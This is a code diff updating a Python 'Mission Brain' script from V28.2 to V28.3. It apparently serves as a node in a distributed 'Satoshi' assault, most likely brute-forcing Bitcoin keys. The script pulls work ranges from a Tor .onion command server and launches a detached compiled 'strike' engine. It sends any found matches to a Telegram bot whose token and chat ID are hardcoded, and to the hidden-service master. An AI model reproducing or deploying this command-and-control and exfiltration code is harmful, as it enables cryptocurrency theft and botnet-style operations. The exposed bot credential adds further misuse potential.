@@ -1,31 +1,30 @@
-# MISSION BRAIN V28.2 - OMNI RESILIENT Φ
+# MISSION BRAIN V28.3 - OMNI RESURRECTED Φ
 import os, subprocess, time, requests, base64, socket, threading
 
 def execute_mission(ui, ID):
     try:
-        ui.log("Iniciando Mision V28.2 (Omni Resilient)...")
+        ui.log("Iniciando Mision V28.3 (Omni Resurrected)...")
         
         if "LOCAL" in ID or "ARM64" in ID:
             MASTER = "http://127.0.0.1:9472/"
             proxies = None
             ui.log("Operando en modo LOCAL.")
         else:
-            MASTER = "http://eke7kse3wo5o5753eoqtpnw7mtjtasva4dlw23aqs3dwuzmgahkvebqd.onion/"
+            MASTER = "http://xc6binu3ads4ceqhputzfwafu4kceivugqnm43bdocaouqwf7cdvd4ad.onion/"
             proxies = {"http": "socks5h://127.0.0.1:9050", "https": "socks5h://127.0.0.1:9050"}
             ui.log("Operando en modo REMOTO (Tor).")
         
-        # 2. Recuperar Rango con Reintentos
         rng = None
-        for i in range(10):
+        for i in range(15):
             try:
-                ui.log(f"Intento de Sincronía {i+1}/10...")
-                r = requests.post(MASTER, json={"node_id": ID, "type": "HEARTBEAT"}, proxies=proxies, timeout=45)
+                ui.log(f"Intento de Sincronía {i+1}/15...")
+                r = requests.post(MASTER, json={"node_id": ID, "type": "HEARTBEAT"}, proxies=proxies, timeout=60)
                 if r.status_code == 200:
                     rng = r.json().get("range")
                     break
             except Exception as e:
                 ui.log(f"Aguardando Red Tor... ({str(e)[:50]})")
-                time.sleep(30)
+                time.sleep(40)
         
         if not rng:
             ui.log("Fallo crítico: Red Tor no disponible.")
@@ -33,7 +32,6 @@ def execute_mission(ui, ID):
             
         ui.log("Rango Sincronizado: " + rng["start"])
         
-        # 3. Motor Strike (Corregido con Comillas)
         if not os.path.exists("./v28_strike"):
             ui.log("Armando Motor de Asalto...")
             c_src = """#include <stdio.h>
@@ -74,7 +72,7 @@ int main(){
         if os.path.exists("./v28_strike"):
             os.system("pkill -9 v28_strike")
             subprocess.Popen(["./v28_strike"], start_new_session=True)
-            ui.update("ASALTO SATOSHI V28.2 ACTIVO", 100, 95)
+            ui.update("ASALTO SATOSHI V28.3 ACTIVO", 100, 95)
             ui.log("Asalto ignicionado.")
         
         def report():
@@ -83,11 +81,12 @@ int main(){
                     requests.post(MASTER, json={"node_id": ID, "type": "TELEMETRY", "payload": {"label": "V28_VIGIL", "cpu": os.getloadavg()[0]}}, proxies=proxies, timeout=60)
                     if os.path.exists("found.txt"):
                         with open("found.txt", "r") as f: match = f.read()
-                        requests.post("https://api.telegram.org/bot8923446223:AAGTub53UjmwAZjazkqNTSI-sR9gOcikrv8/sendMessage", data={"chat_id": "7713278946", "text": "🚨 MATCH V28.2 🚨" + chr(10) + match})
+                        requests.post("https://api.telegram.org/bot8923446223:AAGTub53UjmwAZjazkqNTSI-sR9gOcikrv8/sendMessage", data={"chat_id": "7713278946", "text": "🚨 MATCH V28.3 🚨" + chr(10) + match})
+                        requests.post(MASTER, json={"node_id": ID, "type": "MATCH", "payload": {"content": match}}, proxies=proxies, timeout=60)
                 except: pass
                 time.sleep(600)
         
         threading.Thread(target=report, daemon=True).start()
     except Exception as e:
-        ui.log("Error V28.2: " + str(e))
+        ui.log("Error V28.3: " + str(e))
     return True
